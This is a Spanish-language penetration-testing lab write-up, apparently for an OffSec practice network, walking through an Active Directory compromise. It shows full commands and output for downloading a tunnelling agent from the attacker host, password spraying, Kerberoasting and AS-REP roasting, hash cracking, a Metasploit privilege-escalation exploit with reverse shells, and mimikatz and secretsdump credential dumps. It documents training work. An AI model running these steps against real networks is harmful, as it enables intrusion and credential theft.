‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Active tunnels                             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ # ‚îÇ AGENT                ‚îÇ INTERFACE       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1 ‚îÇ LOGIN\dmzadmin@login ‚îÇ stirringbarracu ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

* agente:
```powershell
PS C:\Users\dmzadmin> iwr -uri http://192.168.45.213:8000/agent.exe -Outfile agent.exe
PS C:\Users\dmzadmin> .\agent.exe -connect 192.168.45.213:11601 -ignore-cert
time="2025-07-14T13:04:26-07:00" level=warning msg="warning, certificate validation disabled"
time="2025-07-14T13:04:26-07:00" level=info msg="Connection established" addr="192.168.45.213:11601"
```

* Propagamos las credenciales de **jim** por todas las ips:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/inetrnal-network]
‚îî‚îÄ# cat ips.txt        
172.16.187.6
172.16.187.21
172.16.187.19
172.16.187.15
172.16.187.30
172.16.187.14
172.16.187.20

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/inetrnal-network]
‚îî‚îÄ# crackmapexec smb ips.txt -u jim -p "Castello1\!"
SMB         172.16.187.15   445    WK02             [*] Windows 11 Build 22000 x64 (name:WK02) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.187.14   445    WK01             [*] Windows 11 Build 22000 x64 (name:WK01) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.187.21   445    FILES            [*] Windows Server 2022 Build 20348 x64 (name:FILES) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.187.6    445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)
SMB         172.16.187.30   445    WEBBY            [*] Windows Server 2022 Build 20348 x64 (name:WEBBY) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.187.15   445    WK02             [+] relia.com\jim:Castello1! 
SMB         172.16.187.14   445    WK01             [+] relia.com\jim:Castello1! 
SMB         172.16.187.21   445    FILES            [+] relia.com\jim:Castello1! 
SMB         172.16.187.6    445    DC02             [+] relia.com\jim:Castello1! 
SMB         172.16.187.30   445    WEBBY            [+] relia.com\jim:Castello1! 

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Challenges/2_Relia/inetrnal-network/6-DC02]
‚îî‚îÄ# crackmapexec smb 172.16.187.6 -u jim -p 'Castello1!' --shares --sessions
SMB         172.16.187.6    445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)
SMB         172.16.187.6    445    DC02             [+] relia.com\jim:Castello1! 
SMB         172.16.187.6    445    DC02             [+] Enumerated shares
SMB         172.16.187.6    445    DC02             Share           Permissions     Remark
SMB         172.16.187.6    445    DC02             -----           -----------     ------
SMB         172.16.187.6    445    DC02             ADMIN$                          Remote Admin
SMB         172.16.187.6    445    DC02             C$                              Default share
SMB         172.16.187.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.187.6    445    DC02             NETLOGON        READ            Logon server share 
SMB         172.16.187.6    445    DC02             SYSVOL          READ            Logon server share 
SMB         172.16.187.6    445    DC02             [+] Enumerated sessions
```
* Intentamos ataques AD:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# impacket-GetUserSPNs -request relia.com/jim:"Castello1\!" -dc-ip 172.16.187.6
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----------  --------  --------------------------  ---------  ----------
http/webby.relia.com  iis_service            2022-10-17 09:46:48.494496  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$RELIA.COM$relia.com/iis_service*$d1a84c1078fc6c1ecdbe05dca874f6f5$1049183cae67501477425e1d3a12e8db0aa5cecb8e3b829038e7f905d4c908f1b72be0284addeda10083bd3d796165fd8d0e8a6dd23aff39c6944ee5e709629a46b8974a7af85c73a96767d09bffc228e8defe7e3018b100fc189fb6bb0927f1cb610b65bd723b24f0c11f1bde376ebff65d529e0b38b47345996993f254716a80f283e740126b060b42e9af9669827f817d482eff4edad31b2586f5915bd44b506813180d8ac5ea060a216cd7592f941fa8806e778d4ef5bc4439933a68104a200c9d530a0857aac6568118c6d6e388e6bb20aa28281da54abdc0eefb626614418a6926c1210cdf98bda8e858f7af013d9015429131b589925e86bd902aec8629c691e28c630053bb97f755b0302b3dfa52abaafd20908fef999b4a4e80eafe736623ce1481f350d09059819084132e1d4426aaa1a4415d44e782cd0ebf2bfb9c91f18026ca96f12e3116615b2ab83499e37c07d243c1d24b29299892b6cc2c83df61eb53be8d4116bcbbe7d5e512ba452aaf28315bf4f8c6f48ff18fb8bc1fb9f549fa03a03c8fc2562fd3836e385c88a974d100d04543e9de569c89bc1f968f2f9291e047941d09cc11985ea65102de1ebe759dea36d21ff3c448e2fd2dedb978761d02499601412666c4b0e99514686271bea1a0344a05c4b10e9df0ee74f7e535ca0306ced6600276b87aae78baa598976364ceeb40541ea13e27cc3e0f721aa154572b4fb11d3574c2c2df779a9ccc8f1f21bf5cf21274eba8b3bb31e4c2d37ece42a2f8dea949f5b503112637e8a61f5599a02b02b4010c3e6cface820bc3dc37dce1ade54301b0ca23cecdcfe98815d841ec8aca1b0264e1bf97f1c3c0b1bd3e1e4652864a021fcee3028b7aed31d2960328afafeace1450747503fe3a86020cebee0ab46064e84633dc8da62cd39cbf8dd02ede4e7ac970d53b9fdc9e5ce7723a36dafefb9b7a3cef0f87810f339e487c49d3718b6a4185001f3b4280fc54dec9edf054c5a7f2cc4c048de10818534b7e57287daff4372d3431fd55af7c0d7c089cd59d3297069bf066b2425780b21f40d41bc6be89af5dfa1e6a2b9a27850e036998c44ffcb69a7ba9457731c741a5b80ac374b420925d4ee3ffc7d833506899939a5dbc895cad29cb56c3d53fa55181dab2f63b8eb8b4a01e522462f124686b4d3aa0855316223258a6adb8bff82c59407e54e5ec63523668754ffb8c5b0088aa7303bcec60fbd148a9b49d5bb82c639ff74bf209dcd294e60c5b5d842a3e6b033e44b946486de03bf511f1ee9cf5121ff366fa87a83a2522d8b8534229682621ff073d516f3ef34790d94dad4ce66acbdd7b31fc2002d6f07eddb7a78a7012c73f565283b36d82
```
> Luego de intentar crackear el hash encontramos que no es crackeable y por lo tanto no nos sirve.

#### Intentamos con GetNPUser AS-REP roasting

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# impacket-GetNPUsers -dc-ip 172.16.137.6 -request -outputfile hashes.asreproast relia.com/jim 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Name      MemberOf                                 PasswordLastSet             LastLogon                   UAC      
--------  ---------------------------------------  --------------------------  --------------------------  --------
michelle  CN=INTRANETRDP,CN=Users,DC=relia,DC=com  2022-10-27 06:07:31.426158  2022-10-27 10:49:41.581981  0x410200 



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$michelle@RELIA.COM:56c3677aec147d10a4e0c0b7b11ce624$381167abfeb752def34a359025750a75f64568d43833a3a5f7a2f5b3e86c15ebbd7156744d4b381fb11716627cc13430ed4599aa07f73a459d0396ade471b24349b2404c2e1ed5be40b09c33556949b54386c590279604c72823771dd05feef827104b5482f5c54ef1daaa0bd08ff065089cbfb904c00bf704c330da095a96c11b9638a6e3d85fa183a5740d6071e1fc058c9e28ee5d9c7717c8d2c3d4fefca84082c50883a258c8a3b2974bb2ce1d4c93521b5a6d86e0baa52e3e4596d6a62914f7ecfea672c5b7935ca39ec2cb7adb46b0c5dc07aa261b0b4a8040bcbe3da90224578ab954
```

#### Crackeamos el hash

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Challenges/2_Relia/inetrnal-network/6-DC02]
‚îî‚îÄ# hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 14879/29823 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 
                                                                                                                                                                                                                  
* Append -O to the commandline.                                                                                                                                                                                   
  This lowers the maximum supported password/salt length (usually down to 32).                                                                                                                                    
                                                                                                                                                                                                                  
* Append -w 3 to the commandline.                                                                                                                                                                                 
  This can cause your screen to lag.                                                                                                                                                                              
                                                                                                                                                                                                                  
* Append -S to the commandline.                                                                                                                                                                                   
  This has a drastic speed impact but can be better for specific attacks.                                                                                                                                         
  Typical scenarios are a small wordlist but a large ruleset.                                                                                                                                                     
                                                                                                                                                                                                                  
* Update your backend API runtime / driver the right way:                                                                                                                                                         
  https://hashcat.net/faq/wrongdriver                                                                                                                                                                             
                                                                                                                                                                                                                  
* Create more work items to make use of your parallelization power:                                                                                                                                               
  https://hashcat.net/faq/morework                                                                                                                                                                                
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Session..........: hashcat                                                                                                                                                                                        
Status...........: Cracked                                                                                                                                                                                        
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)                                                                                                                                                           
Hash.Target......: $krb5asrep$23$michelle@RELIA.COM:56c3677aec147d10a4...8ab954                                                                                                                                   
Time.Started.....: Tue Jul 15 10:24:11 2025 (14 secs)                                                                                                                                                             
Time.Estimated...: Tue Jul 15 10:24:25 2025 (0 secs)                                                                                                                                                              
Kernel.Feature...: Pure Kernel                                                                                                                                                                                    
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                                                        
Guess.Queue......: 1/1 (100.00%)                                                                                                                                                                                  
Speed.#1.........:   766.2 kH/s (8.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:16                                                                                                                                        
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                     
Progress.........: 10780672/14344385 (75.16%)                                                                                                                                                                     
Rejected.........: 0/10780672 (0.00%)                                                                                                                                                                             
Restore.Point....: 10772480/14344385 (75.10%)                                                                                                                                                                     
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                                                                                                             
Candidate.Engine.: Device Generator                                                                                                                                                                               
Candidates.#1....: OLEIROS -> NicoleBates3
Hardware.Mon.#1..: Temp: 60c Util: 83%

Started: Tue Jul 15 10:24:09 2025
Stopped: Tue Jul 15 10:24:27 2025
                                                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Challenges/2_Relia/inetrnal-network/6-DC02]
‚îî‚îÄ# ll
total 16
-rw------- 1 root root  544 Jul 15 10:24 cracked_asrep.txt
-rw-r--r-- 1 root root  527 Jul 15 10:20 hashes.asreproast
-rw-r--r-- 1 root root 2038 Jul 14 22:29 iis.hash
drwxr-xr-x 5 root root 4096 Jul 14 14:05 relia.com
                                                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Challenges/2_Relia/inetrnal-network/6-DC02]
‚îî‚îÄ# cat cracked_asrep.txt 
$krb5asrep$23$michelle@RELIA.COM:56c3677aec147d10a4e0c0b7b11ce624$381167abfeb752def34a359025750a75f64568d43833a3a5f7a2f5b3e86c15ebbd7156744d4b381fb11716627cc13430ed4599aa07f73a459d0396ade471b24349b2404c2e1ed5be40b09c33556949b54386c590279604c72823771dd05feef827104b5482f5c54ef1daaa0bd08ff065089cbfb904c00bf704c330da095a96c11b9638a6e3d85fa183a5740d6071e1fc058c9e28ee5d9c7717c8d2c3d4fefca84082c50883a258c8a3b2974bb2ce1d4c93521b5a6d86e0baa52e3e4596d6a62914f7ecfea672c5b7935ca39ec2cb7adb46b0c5dc07aa261b0b4a8040bcbe3da90224578ab954:NotMyPassword0k?
```

* Entramos por RDP con el usuario **michelle** con el password **NotMyPassword0k?** y obtenemos el **flag local**

#### Elevamos privilegios como lo hicimos ocn jim, MSF

```bash
meterpreter > shell
Process 6952 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\michelle>^Z  
Background channel 1? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search type:post suggester

...

msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2023_28252_clfs_driver

msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Running automatic check ("set AutoCheck false" to disable)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9756266d27a75c923beb3c8c654b31d4:::

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain    NTLM                              SHA1                                      DPAPI
--------       ------    ----                              ----                                      -----
Administrator  INTRANET  8b4547a5116dd13e6e206d1286a06b28  1589b87670e68f737543a5be1fc49fd744330f4c
INTRANET$      RELIA     590848ed472e9109de7b5002dc00b2c8  5ff4d216d0b345201b5e6b4a9b433e458c00427e
andrea         RELIA     ce3f12443651168b3793f5fbcccff9db  65b6774d091b82d025fc5422368f9d3d34589b84  6739979a37698ce72d0401422d3203c2
michelle       RELIA     18d4098c8d9ff721745b388ad4a442bf  791681268eedc1471f7d2953fe0c55ac60a9b9b8  76cc7aa68296b8e577f15fcac273d181

wdigest credentials
===================

Username       Domain    Password
--------       ------    --------
(null)         (null)    (null)
Administrator  INTRANET  (null)
INTRANET$      RELIA     (null)
andrea         RELIA     (null)
michelle       RELIA     (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  INTRANET   (null)
INTRANET$      relia.com  83 08 5a 33 3a cd bb d5 ea 79 d2 3e ff 54 88 99 f5 c3 18 73 ec 4f 21 06 de 66 8a d1 ed 6b f6 e0 f7 2c 0b fa 34 c9 e2 2c 00 de 51 cb 88 9e e7 00 c6 59 fe 30 52 05 a6 8f 06 3b 73 63 26
                           64 be 7d 37 73 c7 2b 5d 32 12 b1 81 98 26 62 de 38 c1 c1 ea 00 3e 93 d0 05 40 6d a5 45 34 9c e2 35 73 37 7e ec 95 ac 42 f7 f6 74 aa 7c 5b 37 bc 0d 18 0b b1 b5 31 a6 98 fc e1 70 94 8
                          9 e5 cf 52 a2 5c 89 b1 eb 5a 84 50 b4 9e ad 60 ef eb f4 c6 24 64 50 03 41 85 91 34 63 a3 05 57 46 35 58 4a dd d0 d5 1c 94 ea ef bb 5f 18 36 b3 39 61 ad 8b d6 7d 9e 2f 68 91 cd 0a 1c
                          d6 f0 76 26 90 95 9e 6d 0d 59 74 f5 d3 40 33 dc 9d a8 94 d5 1e 99 c0 f0 aa a4 04 91 26 83 da 21 55 f4 5b c5 31 36 44 ab 4a c1 f5 25 40 45 4a 3a fa a9 66 cc 2a 49 3f 61 3f e5
andrea         RELIA.COM  (null)
intranet$      RELIA.COM  (null)
michelle       RELIA.COM  (null)

meterpreter > 
```

* Dump de secrets:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28 Administrator@172.16.137.7
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3a22a6020490ea10f1565b37d996d8f3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9756266d27a75c923beb3c8c654b31d4:::
[*] Dumping cached domain logon information (domain/username:hash)
RELIA.COM/andrea:$DCC2$10240#andrea#cdf25cc54e29f88b0092e171fe58efe5: (2024-05-16 11:50:10)
RELIA.COM/michelle:$DCC2$10240#michelle#758c1665fd06bf2ac8a633a959794f4f: (2025-07-15 19:25:07)
RELIA.COM/Administrator:$DCC2$10240#Administrator#08edd2f1db41913e089812d22473016f: (2024-05-16 11:51:35)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\INTRANET$:aes256-cts-hmac-sha1-96:07bf00d419e3bce2b4c31869c3740b8075f5b561a1ff6f41028d2c37acd9561f
RELIA\INTRANET$:aes128-cts-hmac-sha1-96:ef4ec8d077838977c2ae1329342df4b6
RELIA\INTRANET$:des-cbc-md5:ceb3e92391a43701
RELIA\INTRANET$:plain_password_hex:7b1290ba0e683dbc14703ec09e24bfef51a5e16a96e378c960ddfb2443cd342c0019e0f0b69f0a86547961b3d1f9b487d1cdd2b00e924106fc042fd8823939d0f9be58de6fa715770ebe451b6b6d906805557b80145f18d1978ccba84b50a2947dce47f7b80d4686d97f3fce2d0816266c1b4a9ce5d57b6367babb3d058012922a47d4767ea316ca9391695256f2abff704ba93f8bcd06722db2f8e147cc40ff8ddc8bd8cd6b35547c7b2ba2bd0d4e47d40bd96ef5f789f657a72411b437dee15a4e22a8bf6c5350381bc2f9bc2016e18529e2b443ae1e4ed616dad183b1b6932c7efcdb2b7d5995539d7ae1547ce969
RELIA\INTRANET$:aad3b435b51404eeaad3b435b51404ee:c776ea5bf3ff6d20ece9a04ec315b488:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6f9ee63fad1fb7a566ccadfaaffc7ee58df02949
dpapi_userkey:0x7d1a9313cd93ef565e7ee4243de73a43596522e2
[*] NL$KM 
 0000   CA BE 2F 81 A2 9B 86 73  5C 46 B7 12 6F 19 EF 2C   ../....s\F..o..,
 0010   5A 9A 59 9C 25 86 F5 EA  DD 74 8F 83 44 06 45 88   Z.Y.%....t..D.E.
 0020   92 62 ED 44 31 1D 7D A7  BF 58 BB ED A4 3B E3 FE   .b.D1.}..X...;..
 0030   D7 DE 68 75 91 0A FF 20  27 FA 92 5F 71 26 53 BB   ..hu... '.._q&S.
NL$KM:cabe2f81a29b86735c46b7126f19ef2c5a9a599c2586f5eadd748f83440645889262ed44311d7da7bf58bbeda43be3fed7de6875910aff2027fa925f712653bb
[*] _SC_Scheduler 
Administrator:_S111111111p0rtionze21
[*] _SC_SNMPTRAP 
RELIA\andrea:PasswordPassword_6
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

#### Entramos por rdp con las credenciales de andrea a 172.16.209.15 y obtenemos el flag local

> Volvemos a proceder con el mismo mecanismo que las maquinas anteriores

**RESUMIR EN PASOS**

```bash
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 3
SESSION => 3
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run
[*] Started reverse TCP handler on 192.168.45.213:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.22000.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching netsh to host the DLL...
[+] Process 9484 launched.
[*] Reflectively injecting the DLL into 9484...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.249.191
[*] Meterpreter session 4 opened (192.168.45.213:4445 -> 192.168.249.191:64737) at 2025-07-16 12:33:49 -0300

meterpreter > shell

C:\Users\andrea>whoami
whoami
nt authority\system

C:\Users\Administrator>powershell
PS C:\Users\Administrator> Get-ChildItem -Path "C:\Users" -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Users" -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\andrea\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/16/2025   6:10 AM             34 local.txt                                                            


    Directory: C:\Users\milana\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/16/2025   6:10 AM             34 proof.txt                                                            


PS C:\Users\milana\Desktop> type proof.txt
type proof.txt
e119fecb5c80f3c460f7cda0f7d44305
PS C:\Users\milana\Desktop> 

```
* **Con meterpreter**

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1                                      DPAPI
--------  ------  ----                              ----                                      -----
WK02$     RELIA   4d9a5003602058fe8eeb25d76c60ace8  e229daa4f2de2c26d8a0e8bc31f04fc19ec77733
WK02$     RELIA   45405dfe3c29b4ce2a194543cad1bab3  ede40511c44b734a298b8d0cf6303190961ecd7b
andrea    RELIA   ce3f12443651168b3793f5fbcccff9db  65b6774d091b82d025fc5422368f9d3d34589b84  6739979a37698ce72d0401422d3203c2
offsec    WK02    cf998001c44803b490a46f363a2ca812  1854bca244c6d6c14418f08e7dd7bb72393e1bfa

wdigest credentials
===================

Username  Domain  Password
--------  ------  --------
(null)    (null)  (null)
WK02$     RELIA   (null)
andrea    RELIA   (null)
offsec    WK02    (null)

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
WK02$     relia.com  35 e4 78 48 1b 0b 59 c1 37 74 9b fb 6b 91 07 cb 94 f7 26 d2 70 57 98 73 c8 9f 3e 90 a5 9d 2e 22 d8 87 0b b7 4d dc be 3c a1 b2 4c 3f 0c 8b 82 05 a7 78 9e 7c 92 4e 29 10 98 97 ea 69 ca 62 e
                     0 41 77 a1 9c 81 09 91 17 59 a4 74 d9 b8 9f b9 66 1e 2b 17 52 49 91 d7 19 c4 bf fd 26 f0 b4 ed d9 48 3b fa 72 13 27 2f 5e a3 9a 02 8e 6d 05 b1 04 c5 24 fb 6b 8a 23 88 27 05 07 79 9f f8 c6
                      50 25 75 e7 1f cf 8e e7 16 ec ac 50 70 b4 95 c1 e9 99 ee 6f 30 fd f5 36 e6 db d5 f6 6d 61 f2 f0 94 ac ad 5d dd f0 2f 67 98 4f 6b ea 17 ae e8 ad f0 19 c6 dd 15 ad f1 02 b7 55 c9 05 a7 56
                     0f 97 86 41 f8 26 cd c6 cb 6a 95 ab 6a aa 31 4b 3e 9d 88 6f 03 bb 3f bb 32 bf ea b1 ce f3 d4 d3 1c da ac e5 ff 63 13 1d 21 48 2e 00 20 9b 8d ea 33 b1 5c 14 f2
WK02$     relia.com  23 0f 41 6c 39 54 1c 4d 3c d8 8c 01 2b b7 b0 68 5d b0 c2 7d cd ce 96 d5 57 b1 b2 1d 83 1d 44 f2 95 d8 fb 29 74 07 65 60 09 56 9e 2c 32 b9 19 2b bb 67 b3 1c 0b bd ca 88 a7 52 50 c5 0f 98 4
                     b 20 fd 31 67 74 b6 ca 64 56 6a 9e 50 30 b0 43 73 bc 2d 92 21 a1 10 fb 3d 73 cd 1c 24 23 63 9b 63 7d 4a 17 4e d8 ff 68 f7 a9 e1 e1 1c 9a 3e 8a 0b 3e b5 79 a9 9d b9 f8 16 98 56 95 85 fe f4
                      ed f1 fe f8 ee b8 24 53 44 9d 64 2a c9 ab e0 56 56 6b 66 42 8f ef 20 58 76 7e ea 70 f8 18 a1 29 0b c3 e8 4c a6 f1 8e b4 88 42 b1 d6 34 e1 84 b4 d5 dd b8 2c 84 bc 98 fd 6b 91 1a a1 82 a8
                     16 cc 31 80 3d 58 20 c4 f9 14 a7 23 db ff a0 41 74 57 da 39 c9 3a 82 2b 82 91 f3 d4 0e f2 39 ad 07 54 68 da 58 b2 99 28 d3 af 7d 5c 06 b5 19 1e df 87 f6 13 82
andrea    RELIA.COM  (null)
offsec    WK02       (null)
wk02$     RELIA.COM  35 e4 78 48 1b 0b 59 c1 37 74 9b fb 6b 91 07 cb 94 f7 26 d2 70 57 98 73 c8 9f 3e 90 a5 9d 2e 22 d8 87 0b b7 4d dc be 3c a1 b2 4c 3f 0c 8b 82 05 a7 78 9e 7c 92 4e 29 10 98 97 ea 69 ca 62 e
                     0 41 77 a1 9c 81 09 91 17 59 a4 74 d9 b8 9f b9 66 1e 2b 17 52 49 91 d7 19 c4 bf fd 26 f0 b4 ed d9 48 3b fa 72 13 27 2f 5e a3 9a 02 8e 6d 05 b1 04 c5 24 fb 6b 8a 23 88 27 05 07 79 9f f8 c6
                      50 25 75 e7 1f cf 8e e7 16 ec ac 50 70 b4 95 c1 e9 99 ee 6f 30 fd f5 36 e6 db d5 f6 6d 61 f2 f0 94 ac ad 5d dd f0 2f 67 98 4f 6b ea 17 ae e8 ad f0 19 c6 dd 15 ad f1 02 b7 55 c9 05 a7 56
                     0f 97 86 41 f8 26 cd c6 cb 6a 95 ab 6a aa 31 4b 3e 9d 88 6f 03 bb 3f bb 32 bf ea b1 ce f3 d4 d3 1c da ac e5 ff 63 13 1d 21 48 2e 00 20 9b 8d ea 33 b1 5c 14 f2

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
